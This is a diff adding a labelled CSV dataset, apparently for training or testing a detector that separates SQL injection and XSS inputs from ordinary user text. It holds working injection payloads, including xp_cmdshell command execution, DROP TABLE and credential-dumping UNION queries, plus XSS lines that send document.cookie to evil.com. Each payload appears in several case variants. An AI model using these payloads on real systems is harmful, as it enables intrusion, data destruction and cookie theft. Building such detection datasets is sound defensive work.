@@ -1,0 +1,226 @@
+text,label,group_id
+' OR '1'='1,SQL_INJECTION,sqli_0
+' OR 1=1 --,SQL_INJECTION,sqli_1
+AdMiN'--,SQL_INJECTION,sqli_2
+ADMIN'--,SQL_INJECTION,sqli_2
+admin'--,SQL_INJECTION,sqli_2
+' OR 'A'='A,SQL_INJECTION,sqli_3
+' OR 'a'='a,SQL_INJECTION,sqli_3
+1' OR '1' = '1,SQL_INJECTION,sqli_4
+x' AND 1=1 --,SQL_INJECTION,sqli_5
+X' AND 1=1 --,SQL_INJECTION,sqli_5
+1 OR 1=1,SQL_INJECTION,sqli_6
+"' UNION SELECT NULL,NULL--",SQL_INJECTION,sqli_7
+"1 UNION SELECT name, role FROM accounts",SQL_INJECTION,sqli_8
+"1 UNION SELECT email, id FROM accounts",SQL_INJECTION,sqli_8
+"1 UNION SELECT username, password FROM admin_users",SQL_INJECTION,sqli_8
+"1 UNION SELECT name, role FROM admin_users",SQL_INJECTION,sqli_8
+"1 UNION SELECT email, id FROM members",SQL_INJECTION,sqli_8
+"1 UNION SELECT name, role FROM users",SQL_INJECTION,sqli_8
+"1 UNION SELECT email, id FROM admin_users",SQL_INJECTION,sqli_8
+"1 UNION SELECT username, password FROM users",SQL_INJECTION,sqli_8
+"1 UNION SELECT email, id FROM users",SQL_INJECTION,sqli_8
+"1 UNION SELECT name, role FROM members",SQL_INJECTION,sqli_8
+"1 UNION SELECT username, password FROM accounts",SQL_INJECTION,sqli_8
+"1 UNION SELECT username, password FROM members",SQL_INJECTION,sqli_8
+"' UNION SELECT DATABASE(),USER()--",SQL_INJECTION,sqli_9
+"' UNION SELECT dAtAbAsE(),UsEr()--",SQL_INJECTION,sqli_9
+"' UNION SELECT database(),user()--",SQL_INJECTION,sqli_9
+"' AND ExTrAcTvAlUe(1,cOnCaT(0x7e,vErSiOn()))--",SQL_INJECTION,sqli_10
+"' AND extractvalue(1,concat(0x7e,version()))--",SQL_INJECTION,sqli_10
+"' AND EXTRACTVALUE(1,CONCAT(0X7E,VERSION()))--",SQL_INJECTION,sqli_10
+"' AND UpDaTeXmL(1,CoNcAt(0X7E,VeRsIoN()),1)--",SQL_INJECTION,sqli_11
+"' AND UPDATEXML(1,CONCAT(0X7E,VERSION()),1)--",SQL_INJECTION,sqli_11
+"' AND updatexml(1,concat(0x7e,version()),1)--",SQL_INJECTION,sqli_11
+1 OR SLEEP(5),SQL_INJECTION,sqli_12
+1 OR SLEEP(8),SQL_INJECTION,sqli_12
+1 OR SLEEP(3),SQL_INJECTION,sqli_12
+'; WAITFOR DELAY '0:0:8'--,SQL_INJECTION,sqli_13
+'; WAITFOR DELAY '0:0:5'--,SQL_INJECTION,sqli_13
+'; WAITFOR DELAY '0:0:3'--,SQL_INJECTION,sqli_13
+"1 AND BENCHMARK(3000000,MD5(1))",SQL_INJECTION,sqli_14
+1; DROP TABLE admin_users,SQL_INJECTION,sqli_15
+1; DROP TABLE users,SQL_INJECTION,sqli_15
+1; DROP TABLE members,SQL_INJECTION,sqli_15
+1; DROP TABLE accounts,SQL_INJECTION,sqli_15
+1; DELETE FROM users WHERE 1=1,SQL_INJECTION,sqli_16
+1; DELETE FROM admin_users WHERE 1=1,SQL_INJECTION,sqli_16
+1; DELETE FROM accounts WHERE 1=1,SQL_INJECTION,sqli_16
+1; DELETE FROM members WHERE 1=1,SQL_INJECTION,sqli_16
+'; INSERT INTO members VALUES('x')--,SQL_INJECTION,sqli_17
+'; INSERT INTO users VALUES('x')--,SQL_INJECTION,sqli_17
+'; INSERT INTO accounts VALUES('x')--,SQL_INJECTION,sqli_17
+'; INSERT INTO admin_users VALUES('x')--,SQL_INJECTION,sqli_17
+1' #,SQL_INJECTION,sqli_18
+' /*comment*/ OR '1'='1,SQL_INJECTION,sqli_19
+' /*CoMmEnT*/ OR '1'='1,SQL_INJECTION,sqli_19
+' /*COMMENT*/ OR '1'='1,SQL_INJECTION,sqli_19
+'; EXEC Xp_cMdShElL('dIr')--,SQL_INJECTION,sqli_20
+'; EXEC XP_CMDSHELL('DIR')--,SQL_INJECTION,sqli_20
+'; EXEC xp_cmdshell('dir')--,SQL_INJECTION,sqli_20
+1); EXEC MASTER..XP_CMDSHELL 'WHOAMI'--,SQL_INJECTION,sqli_21
+1); EXEC master..xp_cmdshell 'whoami'--,SQL_INJECTION,sqli_21
+1); EXEC mAsTeR..xP_CmDsHeLl 'WhOaMi'--,SQL_INJECTION,sqli_21
+' OR ''=',SQL_INJECTION,sqli_22
+""" OR ""1""=""1",SQL_INJECTION,sqli_23
+1' AND '1'='1,SQL_INJECTION,sqli_24
+' HAVING 1=1--,SQL_INJECTION,sqli_25
+' GROUP BY cOlUmNnAmEs HAVING 1=1--,SQL_INJECTION,sqli_26
+' GROUP BY COLUMNNAMES HAVING 1=1--,SQL_INJECTION,sqli_26
+' GROUP BY columnnames HAVING 1=1--,SQL_INJECTION,sqli_26
+%27 OR 1=1--,SQL_INJECTION,sqli_27
+1' ORDER BY 10--,SQL_INJECTION,sqli_28
+' OR SLEEP(5)#,SQL_INJECTION,sqli_29
+<sCrIpT>AlErT(1)</ScRiPt>,XSS,xss_0
+<script>alert(1)</script>,XSS,xss_0
+<SCRIPT>ALERT(1)</SCRIPT>,XSS,xss_0
+<script>alert(document.cookie)</script>,XSS,xss_1
+<sCrIpT>AlErT(DoCuMeNt.cOoKiE)</ScRiPt>,XSS,xss_1
+<SCRIPT>ALERT(DOCUMENT.COOKIE)</SCRIPT>,XSS,xss_1
+<sCrIpT SrC=//EvIl.cOm/x.jS></ScRiPt>,XSS,xss_2
+<SCRIPT SRC=//EVIL.COM/X.JS></SCRIPT>,XSS,xss_2
+<script src=//evil.com/x.js></script>,XSS,xss_2
+<img src=x onerror=alert(1)>,XSS,xss_3
+<IMG SRC=X ONERROR=ALERT(1)>,XSS,xss_3
+<iMg sRc=x oNeRrOr=aLeRt(1)>,XSS,xss_3
+<svg onload=alert(1)>,XSS,xss_4
+<sVg oNlOaD=AlErT(1)>,XSS,xss_4
+<SVG ONLOAD=ALERT(1)>,XSS,xss_4
+<body onload=alert(1)>,XSS,xss_5
+<BODY ONLOAD=ALERT(1)>,XSS,xss_5
+<bOdY OnLoAd=aLeRt(1)>,XSS,xss_5
+<iNpUt oNfOcUs=aLeRt(1) AuToFoCuS>,XSS,xss_6
+<INPUT ONFOCUS=ALERT(1) AUTOFOCUS>,XSS,xss_6
+<input onfocus=alert(1) autofocus>,XSS,xss_6
+"<a href=""javascript:alert(1)"">click</a>",XSS,xss_7
+"<A HREF=""JAVASCRIPT:ALERT(1)"">CLICK</A>",XSS,xss_7
+"<a hReF=""jAvAsCrIpT:AlErT(1)"">ClIcK</a>",XSS,xss_7
+JAVASCRIPT:ALERT(DOCUMENT.COOKIE),XSS,xss_8
+JaVaScRiPt:aLeRt(dOcUmEnT.CoOkIe),XSS,xss_8
+javascript:alert(document.cookie),XSS,xss_8
+<iFrAmE SrC=JaVaScRiPt:aLeRt(1)>,XSS,xss_9
+<IFRAME SRC=JAVASCRIPT:ALERT(1)>,XSS,xss_9
+<iframe src=javascript:alert(1)>,XSS,xss_9
+<oBjEcT DaTa=jAvAsCrIpT:AlErT(1)>,XSS,xss_10
+<OBJECT DATA=JAVASCRIPT:ALERT(1)>,XSS,xss_10
+<object data=javascript:alert(1)>,XSS,xss_10
+<DIV ONMOUSEOVER=ALERT(1)>HOVER</DIV>,XSS,xss_11
+<div onmouseover=alert(1)>hover</div>,XSS,xss_11
+<dIv oNmOuSeOvEr=aLeRt(1)>HoVeR</dIv>,XSS,xss_11
+<script>fetch(document.cookie)</script>,XSS,xss_12
+<SCRIPT>FETCH(DOCUMENT.COOKIE)</SCRIPT>,XSS,xss_12
+<sCrIpT>FeTcH(DoCuMeNt.cOoKiE)</ScRiPt>,XSS,xss_12
+"<iMg sRc=1 oNeRrOr=aLeRt(STrInG.FrOmChArCoDe(88,83,83))>",XSS,xss_13
+"<IMG SRC=1 ONERROR=ALERT(STRING.FROMCHARCODE(88,83,83))>",XSS,xss_13
+"<img src=1 onerror=alert(String.fromCharCode(88,83,83))>",XSS,xss_13
+<svg/onload=alert(1)>,XSS,xss_14
+<sVg/oNlOaD=AlErT(1)>,XSS,xss_14
+<SVG/ONLOAD=ALERT(1)>,XSS,xss_14
+<marquee onstart=alert(1)>,XSS,xss_15
+<MARQUEE ONSTART=ALERT(1)>,XSS,xss_15
+<mArQuEe oNsTaRt=aLeRt(1)>,XSS,xss_15
+<VIDEO><SOURCE ONERROR=ALERT(1)></VIDEO>,XSS,xss_16
+<video><source onerror=alert(1)></video>,XSS,xss_16
+<vIdEo><SoUrCe oNeRrOr=aLeRt(1)></ViDeO>,XSS,xss_16
+<DETAILS OPEN ONTOGGLE=ALERT(1)>,XSS,xss_17
+<details open ontoggle=alert(1)>,XSS,xss_17
+<dEtAiLs oPeN OnToGgLe=aLeRt(1)>,XSS,xss_17
+'-ALERT(1)-',XSS,xss_18
+'-alert(1)-',XSS,xss_18
+'-AlErT(1)-',XSS,xss_18
+"""><SCRIPT>ALERT(1)</SCRIPT>",XSS,xss_19
+"""><script>alert(1)</script>",XSS,xss_19
+"""><sCrIpT>AlErT(1)</ScRiPt>",XSS,xss_19
+<sCrIpT>WiNdOw.lOcAtIoN='hTtP://EvIl.cOm/sTeAl?c='+dOcUmEnT.CoOkIe</ScRiPt>,XSS,xss_20
+<script>window.location='http://evil.com/steal?c='+document.cookie</script>,XSS,xss_20
+<SCRIPT>WINDOW.LOCATION='HTTP://EVIL.COM/STEAL?C='+DOCUMENT.COOKIE</SCRIPT>,XSS,xss_20
+<STYLE>@IMPORT 'JAVASCRIPT:ALERT(1)';</STYLE>,XSS,xss_21
+<style>@import 'javascript:alert(1)';</style>,XSS,xss_21
+<sTyLe>@ImPoRt 'JaVaScRiPt:aLeRt(1)';</sTyLe>,XSS,xss_21
+<link rel=stylesheet href=javascript:alert(1)>,XSS,xss_22
+<lInK ReL=StYlEsHeEt hReF=JaVaScRiPt:aLeRt(1)>,XSS,xss_22
+<LINK REL=STYLESHEET HREF=JAVASCRIPT:ALERT(1)>,XSS,xss_22
+<tAbLe bAcKgRoUnD=JaVaScRiPt:aLeRt(1)>,XSS,xss_23
+<TABLE BACKGROUND=JAVASCRIPT:ALERT(1)>,XSS,xss_23
+<table background=javascript:alert(1)>,XSS,xss_23
+<iSiNdEx tYpE=ImAgE SrC=1 OnErRoR=AlErT(1)>,XSS,xss_24
+<isindex type=image src=1 onerror=alert(1)>,XSS,xss_24
+<ISINDEX TYPE=IMAGE SRC=1 ONERROR=ALERT(1)>,XSS,xss_24
+best coffee near me,NORMAL,normal_0
+how to reset my password,NORMAL,normal_1
+search for blue shoes size 10,NORMAL,normal_2
+dave@example.com,NORMAL,normal_3
+carol@example.com,NORMAL,normal_3
+bob@example.com,NORMAL,normal_3
+alice@example.com,NORMAL,normal_3
+please update my address to 123 Main St,NORMAL,normal_4
+"I love this product, will buy again!",NORMAL,normal_5
+7,NORMAL,normal_6
+256,NORMAL,normal_6
+42,NORMAL,normal_6
+108,NORMAL,normal_6
+what is the weather like in Hanoi today,NORMAL,normal_7
+what is the weather like in Hue today,NORMAL,normal_7
+what is the weather like in Ho Chi Minh City today,NORMAL,normal_7
+what is the weather like in Da Nang today,NORMAL,normal_7
+add item to cart,NORMAL,normal_8
+checkout with credit card,NORMAL,normal_9
+user dave logged in successfully,NORMAL,normal_10
+user bob logged in successfully,NORMAL,normal_10
+user carol logged in successfully,NORMAL,normal_10
+user alice logged in successfully,NORMAL,normal_10
+order number 256 has shipped,NORMAL,normal_11
+order number 7 has shipped,NORMAL,normal_11
+order number 42 has shipped,NORMAL,normal_11
+order number 108 has shipped,NORMAL,normal_11
+"great customer service, thank you",NORMAL,normal_12
+how do I cancel my subscription,NORMAL,normal_13
+the meeting is scheduled for 3pm tomorrow,NORMAL,normal_14
+bob updated their profile picture,NORMAL,normal_15
+alice updated their profile picture,NORMAL,normal_15
+dave updated their profile picture,NORMAL,normal_15
+carol updated their profile picture,NORMAL,normal_15
+compare prices for laptops under $1000,NORMAL,normal_16
+recipe for chocolate chip cookies,NORMAL,normal_17
+flight from Hanoi to Singapore,NORMAL,normal_18
+flight from Ho Chi Minh City to Singapore,NORMAL,normal_18
+flight from Hue to Singapore,NORMAL,normal_18
+flight from Da Nang to Singapore,NORMAL,normal_18
+please contact support for further assistance,NORMAL,normal_19
+"the product arrived damaged, requesting refund",NORMAL,normal_20
+book a table for two at 7pm,NORMAL,normal_21
+latest news about renewable energy,NORMAL,normal_22
+how to learn TypeScript in 30 days,NORMAL,normal_23
+quarterly sales report for Ho Chi Minh City branch,NORMAL,normal_24
+quarterly sales report for Hanoi branch,NORMAL,normal_24
+quarterly sales report for Da Nang branch,NORMAL,normal_24
+quarterly sales report for Hue branch,NORMAL,normal_24
+carol left a 5 star review,NORMAL,normal_25
+bob left a 5 star review,NORMAL,normal_25
+dave left a 5 star review,NORMAL,normal_25
+alice left a 5 star review,NORMAL,normal_25
+reset password link sent to your email,NORMAL,normal_26
+tracking number for order 7,NORMAL,normal_27
+tracking number for order 256,NORMAL,normal_27
+tracking number for order 108,NORMAL,normal_27
+tracking number for order 42,NORMAL,normal_27
+subscribe to our monthly newsletter,NORMAL,normal_28
+directions to the nearest train station,NORMAL,normal_29
+please select your country from the list,NORMAL,normal_30
+or would you like to unsubscribe instead,NORMAL,normal_31
+the temperature is below 1 degree today,NORMAL,normal_32
+5 < 10 and 10 > 5 are both true,NORMAL,normal_33
+use the <b>bold</b> button to format your text,NORMAL,normal_34
+"it's a great day, isn't it",NORMAL,normal_35
+O'Brien confirmed the reservation for 7 guests,NORMAL,normal_36
+O'Brien confirmed the reservation for 256 guests,NORMAL,normal_36
+O'Brien confirmed the reservation for 42 guests,NORMAL,normal_36
+O'Brien confirmed the reservation for 108 guests,NORMAL,normal_36
+drop by our store this weekend for a sale,NORMAL,normal_37
+insert a new payment method before checkout,NORMAL,normal_38
+delete old messages to free up space,NORMAL,normal_39
+the discount code is valid until 2026 -- act fast,NORMAL,normal_40
+sign up for the creative writing and script workshop this friday,NORMAL,normal_41
+please click <here> to continue,NORMAL,normal_42
+"comment: 'nice service, 5 stars'",NORMAL,normal_43
+update your notification preferences anytime,NORMAL,normal_44
